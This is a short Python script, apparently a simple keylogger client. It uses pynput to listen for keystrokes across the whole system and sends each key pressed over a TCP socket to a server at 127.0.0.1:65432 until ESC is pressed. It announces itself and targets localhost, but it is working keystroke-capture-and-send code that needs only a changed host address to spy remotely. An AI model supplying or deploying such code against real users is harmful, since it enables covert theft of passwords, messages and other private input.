import socket
from pynput import keyboard

HOST = "127.0.0.1"
PORT = 65432

# Create a TCP socket
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((HOST, PORT))

print("Connected to server. Start typing... (Press ESC to quit)")

def on_press(key):
    try:
        key_pressed = key.char
    except AttributeError:
        key_pressed = str(key)

    if key_pressed in ["Key.esc"]:
        print("\nExiting...")
        client_socket.close()
        exit()

    if key_pressed:
        client_socket.sendall(key_pressed.encode())
# Start listening for keyboard input
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
